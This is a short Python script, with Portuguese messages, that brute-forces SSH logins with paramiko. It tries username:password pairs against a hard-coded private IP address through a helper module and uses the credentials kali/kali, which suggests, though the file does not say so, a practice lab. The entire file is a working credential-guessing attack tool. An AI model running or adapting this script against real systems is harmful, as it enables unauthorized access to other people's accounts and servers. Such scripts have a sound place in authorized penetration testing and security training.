import paramiko
import brute_force_main

def try_ssh_login(payload,host):
    name,passwd = payload.strip().split(":")

    try:
        client = paramiko.client.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host,username=name,password=passwd,timeout=1)
        print("Conexão bem sucedida")
        print(name,passwd)
        client.close()
        return True
    except:
        print("Falha de autenticação")
    return False

host = "172.31.141.119"

try:
    response = brute_force_main.brute_force(try_ssh_login,host,"^USER:^PASS",login="kali",password="kali")
    if response:
        print("Parabéns!!!")
    else:
        print("Não foi dessa vez")
except KeyboardInterrupt:
    print("Finalizando programa")

